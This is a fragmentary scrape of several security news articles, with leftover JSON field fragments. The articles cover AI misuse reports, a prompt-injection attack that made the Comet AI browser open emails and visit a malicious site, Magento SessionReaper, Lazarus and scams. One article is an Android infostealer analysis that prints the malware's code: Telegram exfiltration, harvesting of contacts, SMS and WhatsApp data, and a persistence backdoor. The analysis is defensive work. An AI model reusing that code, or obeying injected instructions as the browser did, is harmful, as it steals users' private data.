Protocol (MCP) and Integrating with AI for Agentic Applications”(Tenable)“Cybersecurity in 2025: Agentic AI to change enterprise security and business operations in year ahead”(SC World)“How AI agents could revolutionize the SOC — with human help”(Cybersecurity Dive)“Three Essentials for Agentic AI Security”(MIT Sloan Management Review)“Beyond ChatGPT: The rise of agentic AI and its implications for security”(CSO)2 - Anthropic: How an attacker turned Claude Code into a master hackerThink that OWASP guide is just theoretical? Think again. In a stark example of agentic AI's potential for misuse, AI vendor Anthropic recently revealed how a sophisticated cyber crook weaponized its Claude Code product to “an unprecedented degree” in a broad extortion and data-theft campaign.It’s a remarkable story, even by the standards of the AI world. The hacker used this agentic AI coding tool to:Automate reconnaissance.Harvest victims’ credentials.Breach networks.Make tactical and strategic decisions, such as choosing which data to steal, and crafting “psychologically targeted” extortion demands.Crunch stolen financial data to set the perfect ransom amounts.Generate “visually alarming” ransom notes.The incident takes AI-assisted cyber crime to another level.“Agentic AI has been weaponized. AI models are now being used to perform sophisticated cyberattacks, not just advise on how to carry them out,” Anthropic wrote in an August blog post.This new breed of agentic AI abuse makes security exponentially harder because the tool is autonomous, so it adapts to defenses in real time.(Image generated by Tenable using Google Gemini)By the time Anthropic shut the attacker down, at least 17 organizations had been hit, including healthcare, emergency services, government, and religious groups.Anthropic says it has since built new classifiers – automated screening tools – and detection methods to catch these attacks faster.This incident, which Antropic labeled “vibe hacking,” is just one of 10 real-world use cases included in Anthropic’s “Threat Intelligence Report: August 2025” that detail abuses of the company’s AI tools.Anthropic said it hopes the report helps the broader AI security community strengthen their own defenses.“While specific to Claude, the case studies … likely reflect consistent patterns of behaviour across all frontier AI models. Collectively, they show how threat actors are adapting their operations to exploit today’s most advanced AI capabilities,” the report reads.For more information aboutAI security, check out these Tenable Research blogs:“Frequently Asked Questions About DeepSeek Large Language Model (LLM)”“Frequently Asked Questions About Model Context Protocol (MCP) and Integrating with AI for Agentic Applications”“Frequently Asked Questions About Vibe Coding”“AI Security: Web Flaws Resurface in Rush to Use MCP Servers”“CVE-2025-54135, CVE-2025-54136: Frequently Asked Questions About Vulnerabilities in Cursor IDE (CurXecute and MCPoison)”3 - CSA: Traditional IAM can’t handle agentic AI identity threatsThe Anthropic attack, in which an agentic AI tool stole credentials, highlights a fundamental vulnerability: managing identities for autonomous systems. What happens when you give these autonomous AI systems the keys to your organization’s digital identities?It’s a question that led the Cloud Security Alliance (CSA) to develop a proposal for how to better protect digital identities in agentic AI tools.In its new paper \"Agentic AI Identity and Access Management: A New Approach,\" published in August, the CSA argues that traditional approaches for identity and access management (IAM) fall short when applied to agentic AI systems.“Unlike conventional IAM protocols designed for predictable human users and static applications, agentic AI systems operate autonomously, make dynamic decisions, and require fine-grained access controls that adapt in real-time,” the CSA paper reads.Their solution? A new, adaptive IAM framework that ditches old-school, predefined roles and permissions for a continuous, context-aware approach.The framework is built on several core principles:Zero trust architectureDecentralized identity managementDynamic policy-based access controlContinuous monitoringThe CSA’s proposed framework is built on “rich, verifiable” identities that track an AI agent’s capabilities, origins, behavior, and security posture.Key components of the framework include an agent naming service (ANS) and a unified global session-management and policy-enforcement layer.For more information about IAM in AI systems:“A New Identity: Agentic AI boom risks busting IAM norms”(SC World)“Exposure Management in the realm of AI”(Tenable)“A Novel Zero-Trust Identity Framework for Agentic AI: Decentralized Authentication and Fine-Grained Access Control”(researchers from several universities and companies, including MIT and AWS, via Arvix.org)“Tenable Cloud AI Risk Report 2025”(Tenable)“Enterprises must rethink IAM as AI agents outnumber humans 10 to 1”(VentureBeat)4 - OpenAI: Attackers abuse ChatGPT to sharpen old tricksWhile agentic AI attacks illustrate novel AI-abuse methods, attackers are also misusing conventional AI chatbots for more pedestrian purposes.For example, as OpenAI recently disclosed, attackers have recently attempted to use ChatGPT to refine malware, set up command-and-control hubs, write multi-language phishing emails, and run cyber scams.In other words, these attackers weren’t trying to use ChatGPT to create sci-fi-level super-attacks, but mostly trying to amplify their classic scams, according to OpenAI’s report “Disrupting malicious uses of AI: an update.”“We continue to seethreat actors bolt AI onto old playbooksto move faster, not gain novel offensive capability from our models,” OpenAI wrote in the report, published in October.The report identifies several key trends among threat actors:Using multiple AI modelsAdapting their techniques to hide AI usageOperating in a \"gray zone\" with requests that are not overtly maliciousIncidents detailed in the report include the malicious use of ChatGPT by:Cyber criminalsfrom Russian-speaking, Korean-language, and Chinese-language groups to refine malware, create phishing content, and debug toolsAuthoritarian regimes,specifically individuals linked to the People's Republic of China (PRC), to design proposals for large-scale social media monitoring and profiling, including a system to track UyghursOrganized scam networks, likely based in Cambodia, Myanmar, and Nigeria, to scale fraud by translating messages and creating fake personasState-backed influence operationsfrom Russia and China to generate propaganda, including video scripts and social media posts“Our public reporting, policy enforcement, and collaboration with peers aim to raise awareness of abuse while improving protections for everyday users,” OpenAI wrote in the statement “Disrupting malicious uses of AI: October 2025.”For more information aboutAI security, check out these Tenable resources:“2025 Cloud AI Risk Report: Helping You Build More Secure AI Models in the Cloud”(on-demand webinar)“Cloud & AI Security at the Breaking Point — Understanding the Complexity Challenge”(solution overview)“Exposure Management in the realm of AI”(on-demand webinar)“Expert Advice for Boosting AI Security”(blog)“AI Is Your New Attack Surface”(on-demand webinar)5 - Is your AI coding buddy a security risk?Hackers aren't the only ones using AI to code. Your own developers are, too. But the productivity gain they get from AI coding assistants can be costly if they’re not careful.To help developers with this issue, the Open Source Security Foundation (OpenSSF) published the “Security-Focused Guide for AI Code Assistant Instructions.”“AI code assistants are powerful tools,” reads the OpenSSF blog “New OpenSSF Guidance on AI Code Assistant Instructions.” “But they also create security risks, because the results you get depend heavily on what you ask.”The guide, published in September, provides developers tips and best practices on how to prompt these AI helpers to reduce the risk that they’ll generate unsafe code.Specifically, the guide aims to ensure that AI coding assistants consider:Application code security, such as validating inputs and managing secretsSupply chain safety, such as selecting safe dependencies and using package managersPlatform or language-specific issues, such as applying security best practices to containersSecurity standards and frameworks,such as those from OWASP and the SANS Institute“In practice, this means fewer vulnerabilities making it into your codebase,” reads the guide.For more information about the cyber risks of AI coding assistants:“Hackers setting traps for vibe coders: AI assistants can deliver malware”(Cybernews)“Cybersecurity Risks of AI-Generated Code”(Georgetown University)“Security risks of AI-generated code and how to manage them”(TechTarget)“AI-generated code risks: What CISOs need to know”(ITPro)“GitLab's AI Assistant Opened Devs to Code Theft”(Dark Reading)6 - PwC: Cyber teams can’t get enough AIFinally, here’s how organizations are fighting back. They’re leaning heavily into AI to strengthen their cyber defenses, including by prioritizing the use of defensive agentic AI tools.That’s according to PwC’s new “2026 Global Digital Trust Insights: C-suite playbook and findings” report, based on a global survey of almost 4,000 business and technology executives.“AI’s potential for transforming cyber capabilitiesis clear and far-reaching,” reads a PwC article with highlights from the report, published in October.For example, organizations are prioritizing the use of AI to enhance how they allocate cyber budgets; use managed cybersecurity services; and address cyber skills gaps.With regards to respondents' priorities for AI cybersecurity capabilities in the coming year, threat hunting ranked first, followed by agentic AI. Other areas include identity and access management, and vulnerability scanning / vulnerability assessments.AI security capabilities organizations will prioritize over the next 12 monthsMeanwhile, organizations plan to use agentic AI primarily to bolster cloud security, data protection, and security operations in the coming year. Other agentic AI priority areas include security testing; governance, risk and compliance; and identity and access management.“Businesses are recognising that AI agents — autonomous, goal-directed systems capable of executing tasks with limited human intervention — have enormous potential to transform their cyber programmes,” reads the report.Beyond AI, the report also urges cyber teams to prioritize prevention over reaction. Proactive work like monitoring, assessments, testing, and training is always cheaper than the crisis-mode alternative of incident response, remediation, litigation, and fines. Yet, only 24% of organizations said they spend “significantly more” on proactive measures.Other topics covered in the report include geopolitical risk; cyber resilience; the quantum computing threat; and the cyber skills gap.For more information aboutAI data security, check out these Tenable resources:“Harden Your Cloud Security Posture by Protecting Your Cloud Data and AI Resources”(blog)“Tenable Cloud AI Risk Report 2025”(report)“New Tenable Report: How Complexity and Weak AI Security Put Cloud Environments at Risk”(blog)“Securing the AI Attack Surface: Separating the Unknown from the Well Understood”(blog)“The AI Security Dilemma: Navigating the High-Stakes World of Cloud AI”(blog)Check back here next Friday, when we’ll share some of the best AI risk-management and governance best practices from recent months.",

      "published_date": "2025-10-24",
      "content": "You’ve probably noticed that artificial intelligence, or AI, has been everywhere lately—news, phones, apps, even in your browser. It seems like everything suddenly wants to be “powered by AI.“ If it’s not, it’s considered old school and boring. It’s easy to get swept up in the promise: smarter tools, less work, and maybe even a glimpse of the future.But if we look at some of the things we learned just this week, that glimpse doesn’t only promise good things. There’s a quieter story running alongside the hype that you won’t see in the commercials. It’s the story of how AI’s rapid development is leaving security and privacy struggling to catch up.And if you make use of AI assistants, chatbots, or those“smart” AI browserspopping up on your screen, those stories are worth your attention.Are they smarter than us?Even some of the industry’s biggest names—Steve Wozniak, Sir Richard Branson, and Stuart Russel—areworriedthat progress in AI is moving too fast for its own good. In anarticle published by ZDNet, they talk about their fear of “superintelligence,” saying they’re afraid we’ll cross the line from “AI helps humans” to “AI acts beyond human control” before we’ve figured out how to keep it in check.These scenarios are not about killer robots or takeovers like in the movies. They’re about much smaller, subtler problems that add up. For example, an AI system designed to make customer service more efficient might accidentally share private data because it wasn’t trained to understand what’s confidential. Or an AI tool designed to optimize web traffic might quietly break privacy laws it doesn’t comprehend.At the scale we use AI—billions of interactions per day—these oversights become serious. The problem isn’t that AI is malicious; it’s that it doesn’t understand consequences, and developers forget to set boundaries.We’re already struggling to build basic online safety into the AI tools that are replacing our everyday ones.AI browsers: too smart, too soonAI browsers—and their newer cousin, the ‘agentic’ browser—do more than just display websites. They can read them, summarize them, and even perform tasks for you.A browser that can search, write, and even act on your behalf sounds great—but you may want to rethink that. According toresearch reported by Futurism, some of these tools are being rolled out with deeply worrying security flaws.Here’s the issue: many AI browsers are just as vulnerable to prompt injection as AI chatbots. The difference is that if you give an AI browser a task, it runs off on its own and you have little control over what it reads or where it goes.Take Comet, a browser developed by the company Perplexity.Researchers at Brave foundthat Comet’s “AI assistant” could be tricked into doing harmful things simple because it trusted what it saw online.In one test, researchers showed the browser a seemingly innocent image. Hidden inside that image was a line of invisible text—something no human would see, but instructions meant only for the AI. The browser followed the hidden commands and ended up opening personal emails and visiting a malicious website.In short, the AI couldn’t tell the difference between a user’s request and an attacker’s disguised instructions. That is a typical example of a prompt injection attack, which works a bit like phishing for machines. Instead of tricking a person into clicking a bad link, it tricks an AI browser into doing it for you. Without the realization of “oops, maybe I shouldn’t have done that,” it is faster, quiet, and with access you might not even realize it has.The AI has no idea it did something wrong. It’s just following orders, doing exactly what it was programmed to do. It doesn’t know which instructions are bad because nobody taught it how to tell the difference.Misery loves company: spoofed AI interfacesEven if the AI engine itself worked perfectly, attackers have another way in: fake interfaces.According toBleepingComputer, scammers are already creating spoofed AI sidebars that look identical to genuine ones from browsers like OpenAI’s Atlas and Perplexity’s Comet. These fake sidebars mimic the real interface, making them almost impossible to spot. Picture this: you open your browser, see what looks like your trusted AI helper, and ask it a question. But instead of the AI assistant helping you, it’s quietly recording every word you type.Some of these fake sidebars even persuade users to “verify” credentials or “authorize” a quick fix. This is social engineering in a new disguise. The scammer doesn’t need to lure you away from the page, they just need to convince you that the AI you’re chatting with is legitimate. Once that trust is earned, the damage is done.And since AI tools are designed to sound helpful, polite, and confident, most people will take their word for it. After all, if an AI browser says, “Don’t worry, this is safe to click,” who are you to argue?What can we do?The key problem right now is speed. We keep pushing the limits of what AI can do faster than we can make it safe. The next bigproblem will be the datathese systems are trained on.As long as we keep chasing the newest features, companies will keep pushing for more options and integrations—whether or not they’re ready. They’ll teach your fridge to track your diet if they think you’ll buy it.As consumers, the best thing we can do is stay informed about new developments and the risks that come with them. Ask yourself: Do I really need this? What am I trusting it with? What’s the potential downside? Sometimes it’s worth doing things the slower, safer way.Pro tip: I installed Malwarebytes’Browser Guardon Comet, and it seems to be working fine so far. I’ll keep you posted on that.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

      "content": "Early September,a security researcheruncovered a new vulnerability in Magento, an open-source e-commerce platform used by thousands of online retailers, and its commercial counterpart Adobe Commerce. It sounds like something straight out of a horror movie:SessionReaper. Behind the cinematic name hides a very real and very dangerous remote code execution flaw, tracked asCVE-2025-54236. It allows attackers to hijack live customer sessions—and, in some setups, even take full control of the server that runs the store.SessionReaper lives in a part of Magento that handles communication between the store and other services. The bug stems from improper input validation and unsafe handling of serialized data. In plain terms, Magento sometimes trusts data that no web application ever should. This lets an attacker trick the system into accepting a specially crafted “session” file as a legitimate user login—no password required.What they can do with that login depends on how the store is configured, but researchers atSecPod warn:“Successful exploitation of SessionReaper can lead to several severe consequences, including security feature bypass, customer account takeover, data theft, fraudulent orders, and potentially remote code execution.”Session-stealers like this one mean a compromised store can quietly expose a shopper’s personal details, order information, or payment data to attackers. In some cases, criminals inject “skimmer” code that harvests card details as you type them in or reroutes you to phishing sites designed to look like legitimate checkouts.A patch for the vulnerability wasreleasedon September 9, but six weeks later, roughly 62% of Magento storesreportedlyremain unpatched. After someone published a proof-of-concept (PoC), cybercriminals quickly built working exploits and attacks are now spreading fast. So, while SessionReaper isn’t malware a shopper can “catch” directly, it can turn even trusted stores into possible data-theft traps until the site owners patch.Researchers at Sansec, whose sensors monitor e-commerce attacks worldwide,reportseeing more than 250 Magento stores compromised within 24 hours of the exploit code going public.How consumers can stay safeWeb store owners should patch their Magento sites immediately. Unfortunately, regular shoppers have almost no way to tell whether a store is still vulnerable or already secured.From a consumer’s point of view, SessionReaper is another reminder that even trusted stores can quietly become unsafe between page loads. When a platform as widespread as Magento is under active attack, the best defense often lies outside the store itself.Watch out for odd behavior on a site or missing valid HTTPS, and don’t enter payment or personal data if something seems suspicious.Where possible, opt for checkout options that use third-party gateways (like PayPal), as they’re isolated from the store’s servers.Report suspicious e-commerce behavior to the site operator or your payment provider straight away.Shop on reputable sites whenever you can, or check the reviews and reputation of any new sellers before buying.Make sure your operating system, browser, andanti-malware softwareare up to date to protect against the latest threats.We don’t just report on threats—we remove themCybersecurity risks should never spread beyond a headline.

The company hasannouncedmore safeguards to protect users (especially the elderly) from scammers.The social media, publishing, and VR giant has added a new warning on WhatsApp that displays an alert when you share your screen during video calls with unknown contacts.On Messenger, protection begins with on-device behavioral analysis, complemented by an optional cloud-based AI review that requires user consent. The on-device protection will flag suspicious messages from unknown accounts automatically. You then have the option to forward it to the cloud for further analysis (although note that this will likely break the default end-to-end encryption on that message, as Meta has to read it to understand the content). Meta’s AI service will then explain why the device interpreted the message as risky and what to do about it, offering information about common scams to provide context.That context will be useful for vulnerable users, and it comes after Meta worked with researchers at social media analysis company Graphika to document online scam trends. Some of the scams it found included fake home remodeling services, and fraudulent government debt relief sites, both targeting seniors. There were also fake money recovery services offering to get scam victims’ funds back (which we’vecovered before).Here’s a particularly sneaky scam that Meta identified: fake customer support scammers. These jerks monitor comments made under legitimate online accounts for airlines, travel agencies, and banks. They then contact the people who commented, impersonating customer support staff and persuading them to enter into direct message conversations or fill out Google Forms. Meta has removed over 21,000 Facebook pages impersonating customer support, it said.A rising tide of scamsWe can never have too many protections for vulnerable internet users, as scams continue to target them through messaging and social media apps. While scams target everyone (costing Americans $16.6 billion in losses,according tothe FBI’s cybercrime unit IC3), those over 60 are hit especially hard. They lost $4.8 billion in 2024. Overall, losses from scams were up 33% across the board year-on-year.Other common scams include “celebrity baiting”, which uses celebrity figures without their knowledge to dupe users into fraudulent schemes including investments and cryptocurrency. With deepfakes making it easier than ever to impersonate famous people, Meta has been testing facial recognition to help spot celebrity-bait ads for a year now, and recentlyannouncedplans to expand that initiative.If you know someone less tech-savvy who uses Meta’s apps, encourage them to try these new protections—like Passkeys and Security Checkup. Passkeys let you log in using a fingerprint, face, or PIN, while Security Checkup guides you through steps to secure your account.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit. DownloadMalwarebytes Mobile Security for iOS or Androidand try it today!",
      "summary": "Meta has implemented enhanced protection measures on its platforms WhatsApp and Messenger to combat scams, particularly targeting elderly users who are often victims of fraudulent activities. The new safeguard includes a warning system that alerts users when they share their screens during video calls with unknown contacts, which is followed by an optional cloud-based AI review for further analysis if desired. This feature aims to protect vulnerable users from falling prey to common scams such as fake customer support and government debt relief schemes. Meta's collaboration with Graphika has helped identify various scam trends, including those targeting seniors through fake home remodeling services and fraudulent government sites. The company has also taken steps to combat celebrity baiting scams by expanding its facial recognition technology for detecting impersonation attempts in ads.

      "content": "Infostealers landscape exploded in 2024 and they remain a top threat today. If Windows remains a nice target (read: Attackers' favorite), I spotted an Infostealer targeting Android devices. This sounds logical that attackers pay attention to our beloved mobile devices because all our life is stored on them.The sample that I found (SHA256: 7576cdb835cd81ceb030f89fe5266649ed4a6201547c84da67144f407684a182) received a VT score of 0/64[1]! Undetected! The source code contains comments in Vietnamese. The sample is a Python script. How can you execute Python code on an Android device? Say hello to Termux, your new best friend.From the documentation: \"Termux[2] is an Android terminal emulator and Linux environment app that works directly with no rooting or setup required. A minimal base system is installed automatically - additional packages are available using the APT package manager.\"Sounds great to run Python code.Once Termux is installed, add the Python package:$ pkg install pythonThe infostealer is classic and exfiltrate data through a Telegram channel:def send_telegram(msg):\n    try:\n        url = f\"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage\"\n        data = {\"chat_id\": CHAT_ID, \"text\": msg}\n        requests.post(url, data=data, timeout=10)\n    except: passBut, how can the malware access Android data? Termux comes with a suite a command-line tools that provide juicy information. For example, termux-contact-list[3] returns a list of contacts stored in the phone in JSON:[\n  {\n    \"id\": 1,\n    \"name\": \"Alice Dupont\",\n    \"phone_numbers\": [\n      \"+32470123456\",\n      \"+3221234567\"\n    ],\n    \"emails\": [\n      \"alice.dupont@example.com\"\n    ]\n  },\n  {\n    \"id\": 2,\n    \"name\": \"Bob Martin\",\n    \"phone_numbers\": [\n      \"+32475123456\"\n    ],\n    \"emails\": []\n  },\n  {\n    \"id\": 3,\n    \"name\": \"Caroline Smith\",\n    \"phone_numbers\": [],\n    \"emails\": [\n      \"caroline.smith@company.com\",\n      \"c.smith@gmail.com\"\n    ]\n  }\n]The infostealer will collect and exfiltrate the following information:contacts = subprocess.getoutput('termux-contact-list')\nsms = subprocess.getoutput('termux-sms-list')\ncall_log = subprocess.getoutput('termux-call-log')\nlocation = subprocess.getoutput('termux-location')The malware tries also to exfiltrate data from apps like Facebook and Whatsapp. How?

That one will allow access to the phone storage through a mapping lile:/storage/emulated/0/<dir>Note that the victim will be prompted with a dialog prompt asking right to access data. But they’ll do right?The malware will try to exfiltrate more data:fb_paths = [\n    '/storage/emulated/0/Android/data/com.facebook.katana/',\n    '/storage/emulated/0/Facebook/'\n]\nwa_paths = [\n    '/storage/emulated/0/WhatsApp/Databases/msgstore.db',\n    '/storage/emulated/0/WhatsApp/Databases/wa.db',\n    '/sdcard/WhatsApp/Databases/msgstore.db'\n]\nmedia_paths = [\n    '/storage/emulated/0/DCIM/',\n    '/storage/emulated/0/Pictures/',\n    '/storage/emulated/0/Movies/',\n    '/storage/emulated/0/Download/'\n]It will also search for banking related information:banking_files = []\n    for root, dirs, files in os.walk('/storage/emulated/0/'):\n        for file in files:\n            if any(keyword in file.lower() for keyword in ['bank', 'atm', 'vietcombank', 'vpbank', 'mbbank', 'acb']):\n                banking_files.append(os.path.join(root, file))Get device info:device_model = subprocess.getoutput('getprop ro.product.model')\nandroid_version = subprocess.getoutput('getprop ro.build.version.release')\ndevice_name = subprocess.getoutput('getprop ro.product.device')A backdoor will be installed:def install_backdoor():\n    try:\n        backdoor_script = '''\nimport os, time, requests\nwhile True:\n    try:\n        os.system(\"termux-location > /data/data/com.termux/files/home/location.txt\")\n        time.sleep(300)\n    except:\n        time.sleep(60)\n'''\n        with open('/data/data/com.termux/files/home/backdoor.py', 'w') as f:\n            f.write(backdoor_script)\n            os.system('python3 /data/data/com.termux/files/home/backdoor.py &')\n        except: passI just found the infostealer and I don’t know the complete infection path.

      "content": "North Korean Lazarus hackers targeted 3 European defense firms via Operation DreamJob, using fake recruitment lures to hit UAV tech staff.North Korea-linkedLazarus APT group(akaHidden Cobra) launchedOperation DreamJob, compromising three European defense companies. Threat actors used fake recruiter profiles to lure employees into UAV technology roles, aiming to gain access to sensitive information through targeted social engineering.TheOperation DreamJobhas been active since at least 2020, threat actors have been observed using social engineering techniques to compromise its targets, with fake job offers as the lure.The Lazarus APT has been active since 2009 and is behind major incidents like theSony hack,WannaCry, and global cyberheists.ESET reports that Lazarus’ latest Operation DreamJob targets UAV technology, reflecting North Korea’s push to develop drones modeled on Western designs.ESET observed new Operation DreamJob attacks starting in March 2025, targeting three European defense firms, a metal engineering company, an aircraft parts maker, and a defense contractor. The three European defense firms producing equipment used in Ukraine, attackers likely aimed at stealing UAV and weapons data. Lazarus gained access via fake job offers carrying trojanized PDFs, deploying the ScoringMathTea RAT for full control. Targets were linked to UAV technology, suggesting espionage aligned with North Korea’s drone development efforts and its cooperation with Russia in the Ukraine war.North Korea’s UAV program heavily relies on reverse engineering and IP theft, with drones like the Saetbyol-4 and Saetbyol-9 mimicking models manufactured by US firms. Evidence suggests Pyongyang uses cyberespionage, via Lazarus and related APTs, to steal UAV designs and manufacturing know-how. Operation DreamJob likely sought proprietary data on Western UAVs, aiding North Korea’s expanding drone production efforts.In 2025 Operation DreamJob, Lazarus shifted tools into two tiers: early-stage droppers/loaders/downloaders and main-stage payloads like the ScoringMathTea RAT. Researchers saw trojanized MuPDF, TightVNC, Notepad++ plugins, a libpcre loader, QuanPinLoader, BinMergeLoader, and a DirectInput-style dinput.dll. Loaders decrypt AES-128/ChaCha20 payloads and load them in memory via MemoryModule.The researchers pointed out that main implants never appear unencrypted on disk. BinMergeLoader mirrors Mandiant’sMISTPENand abuses Microsoft Graph tokens. It is interesting to note that submissions came from Italy and Spain; one dropper bore the internal name DroneEXEHijackingLoader.dll, linking the campaign to UAV-focused targets.ScoringMathTea is a Lazarus-linked RAT that supports approximately 40 commands, combining file/process control, data exfiltration, and remote command execution.“The implemented functionality is the usual required by Lazarus: manipulation of files and processes, exchanging the configuration, collecting the victim’s system info, opening a TCP connection, and executing local commands or new payloads downloaded from the C&C server.” readsESET’s report. “The current version does not show any dramatic changes in its feature set or its command parsing. So the payload is probably receiving continuous, rather minor improvements and bug fixes.”First seen in 2022 via Airbus-themed job lures, it has since targeted firms in Portugal, Germany, India, Poland, the UK, and Italy. The malicious code is likely a key Operation DreamJob payload, it evolves through minor updates and shares traits with Lazarus tools like LightlessCan.For nearly three years, Lazarus has consistently used ScoringMathTea and trojanized open-source apps in Operation DreamJob, achieving polymorphism that evades detection but not attribution. Despite media exposure, employee awareness in key sectors remains low. The campaign likely sought UAV-related data to support North Korea’s expanding drone program.For nearly three years, Lazarus has consistently used ScoringMathTea and trojanized open-source apps in Operation DreamJob, achieving polymorphism that evades detection but not attribution. Despite media exposure, employee awareness in key sectors remains low. The campaign likely sought UAV-related data to support North Korea’s expanding drone program.“Also, even with widespread media coverage of Operation DreamJob and its use of social engineering, the level of employee awareness in sensitive sectors – technology, engineering, and defense – is insufficient to handle the potential risks of a suspicious hiring process.” concludes the report.“Although alternative hypotheses are conceivable, there are good reasons to think that this Operation DreamJob campaign was in no small part intended to collect sensitive information on UAV-related technology. Considering North Korea’s current efforts at scaling up its drone industry and arsenal, it seems likely that other organizations active in this sector will whet the appetite of North Korea-aligned threat actors in the near future.”Follow me on Twitter:@securityaffairsandFacebookandMastodonPierluigi Paganini(SecurityAffairs– hacking, North Korea)",
      "summary": "The Lazarus group, a North Korean state-sponsored hacking organization known for its sophisticated cyber attacks and espionage activities, has recently launched Operation DreamJob targeting European defense firms with a focus on UAV (Unmanned Aerial Vehicle) technology. The operation involved the use of fake recruitment lures to lure employees into compromising positions within these companies, aiming to gain access to sensitive information through targeted social engineering techniques. This campaign has been active since at least 2020 and has expanded its scope beyond North Korea's traditional targets in Asia, reflecting a broader effort to develop drone technology modeled on Western designs.\n\nThe Lazarus group, operating under various names including Hidden Cobra, has a history of cyber attacks that include the infamous Sony hack, WannaCry ransomware, and numerous global cyber heists. Their latest Operation DreamJob targets UAV technology firms in Europe, suggesting a strategic shift towards espionage operations to steal proprietary data on Western UAVs and enhance North Korea's drone production capabilities.\n\nThe campaign primarily uses trojanized versions of legitimate software such as MuPDF, TightVNC, Notepad++, and other open-source applications to deliver the ScoringMathTea RAT (Remote Administration Tool). This tool supports a wide range of malicious activities including file manipulation, data exfiltration, and remote command execution. The continued use of this tool despite its exposure highlights Lazarus's persistence in achieving their objectives through evasion techniques.",

JLR combines two iconic brands, Jaguar and Land Rover. Since 2008, JLR has been owned by Tata Motors (India), which bought it from Ford. JLR sells vehicles in over 120 countries, with major markets in Europe, North America, and China.In mid-September, JLR confirmed that the cyberattack also led to a data breach without disclosing details about the type of information that had been compromised.Now the Cyber Monitoring Centre estimated that the cyberattack onJaguar Land Roverthat halted production for over a month cost the UK economy an estimated £1.9 billion ($2.5 billion).Cyber Monitoring Centre (CMC) states that the attack is “the most economically damaging cyber event” ever impacted the United Kingdom.The Cyber Monitoring Centre rated the Jaguar Land Rover cyberattack as a Category 3 systemic event, it impacted over 5,000 firms.“The CMC model estimates the event caused aUK financial impact of £1.9 billion and affected over 5,000 UK organisations. The modelled range of loss is £1.6 billion to £2.1 billion but this could be higher if operational technology has been significantly impacted or there are unexpected delays in bringing production back to pre-event levels.”reads the CMC’s report. “This estimate reflects the substantial disruption to JLR’s manufacturing, to its multi-tier manufacturing supply chain, and to downstream organisations including dealerships”The JLR cyberattack qualifies as a Category 3 event, causing £1–5B in UK losses and affecting over 2,700 firms. UnlikeWannaCryorCrowdStrike, it hit one main victim but spread economically through supply chains. The incident also impacted workers, prompting pay cuts, layoffs, and heightened job insecurity across the automotive sector.The CMC estimates the cyberattack caused £1.9B in losses (range £1.6B–£2.1B), mainly from halted production and supply chain disruption. Vehicle output fell by 5,000 per week for five weeks, costing £108M weekly. Recovery to full production is expected by early January 2026. Losses also include IT rebuild, supplier strain, and reduced sales.

      "published_date": "2025-10-23",
      "content": "It seems pretty obvious: If an attacker can exploit a vulnerability before you can patch it, your organization is at risk. Yet the gaps between different phases of the vulnerability disclosure process continue to leave security teams in the dark.Key takeaways:Of the 63,862 CVEs issued between Jan. 1, 2024 and Sept. 30, 2025, 2.6% had a public proof-of-concept (PoC) published.More than half of these (56%) had a PoC published in less than seven days.Yet, it takes on average 15 days for a vulnerability to be published to the National Vulnerabilities Database, which is used as the core data source for a number of scanning tools, leaving security teams at risk.Vulnerability management is often described as a race against the attackers. If an attacker can exploit a vulnerability before you can patch it, the results can be devastating.. This is why the time lapse between vulnerability disclosure to exploitation is critical; the longer defenders go without visibility into new vulnerabilities, or awareness that those vulnerabilities are being exploited, the greater the risk that their organizations will be compromised.There are several key phases in the typical vulnerability timeline that are worth noting:Publication of a vulnerability advisory, at which time the common vulnerabilities and exposures (CVE) number issued by a CVE Naming Authority is typically initially made public. The CVE catalog is managed by MITRE.Publication to the National Vulnerabilities Database (NVD). While a CVE number can be assigned immediately upon publication of an advisory, more detail is needed before it can be evaluated by NIST and assigned a score on the NVD.The publication of a proof-of-concept (PoC), often considered an important first step in a vulnerability being leveraged by attackers.Disclosure of a functional exploit to one of the major exploit frameworks.Disclosure of known exploitation.Thegaps in time between when a CVE is made public, when it appears in MITRE, and when that CVE is published on NVD create blind spots for cybersecurity organizations. Additional risk lurks in the time lapses between each of the subsequent phases of a vulnerability's lifecycle.In this article, we look at timelines for CVEs from 2024 and 2025, analyzing key points along those timelines and showing how Tenable is often at the leading edge of visibility whether a vulnerability is newly disclosed or being exploited in the wild or at any point in between.Between Jan. 1, 2024 and September 30, 2025 there were 63,862 CVEs disclosed. Of these:774 received a CVSSv3 severity rating of High and 478 were Critical2.6% (1,665) have a known public PoC published — specifically exploit code that has been publicly disclosed..5% (314) have documented evidence of active exploitation in the wild, slightly more than the 253 in the CISA Known Exploited Vulnerabilities (KEV) catalog.Relying on disclosure to NVD introduces risky gapsWhile NVD is used by a number of scanning tools as a core data source and it is sometimes seen as the starting point in disclosure, in reality it is typically at the tail end of CVE publication. It is only after a CVE has been reserved by a CNA, issued by that CNA, published to MITRE, and then further analyzed by NIST that it is then published to NVD.It is true that progress has been made on this process, particularly for some vendors, but our analysis of CVEs published in 2024 and 2025 shows there is still a fairly significant lag. For this analysis, we focused on CVEs that Tenable covered, as these will typically have better data on initial disclosure. We found that the average delay from initial vulnerability disclosure to NVD was 15.2 days. This means anyone dependent on NVD for vulnerability information is over two weeks behind the curve, on average, before they learn about a vulnerability.This lag becomes even more concerning when we look at the time between disclosure and PoC or, even worse, exploitation in the wild — both events that correspond to a significant increase in risk.Disclosure to PoC puts attackers on alertOne of the major events that can occur in the lifecycle of a vulnerability is the publication of a PoC. The reality is that a vast majority of published CVEs never have a PoC published and even fewer are actually exploited, with our analysis showing evidence of PoC for 1,665 of the CVEs in the set we analyzed. The publication of a PoC is often considered an important first step in a vulnerability being leveraged by attackers. PoC code, no matter how rudimentary it is, can provide details about the vulnerability and how to exploit it. Attackers can take this code, adjust it, improve it, then use it as part of an attack.The lag time to NVD is even more concerning when we consider how quickly PoCs are published. More than half (56%) of the 1,665 CVEs we analyzed had a PoC published in less than seven days. That's half the time, on average, that it takes for CVEs to be published to NVD.On average, it took 43 days for a PoC to be published, but that number is heavily skewed by the small set of vulnerabilities that did not see a PoC published until many months after initial disclosure.Source: Tenable Research, October 2025Disclosure to functional exploit: less common, no less concerningWe consider an exploit to be functional in cases where it is added to one of the major exploit frameworks but not necessarily being actively exploited in the wild. The disclosure of a functional exploit is another maturity step that lowers the bar for attackers because the code for these is typically more mature and has a higher success rate. 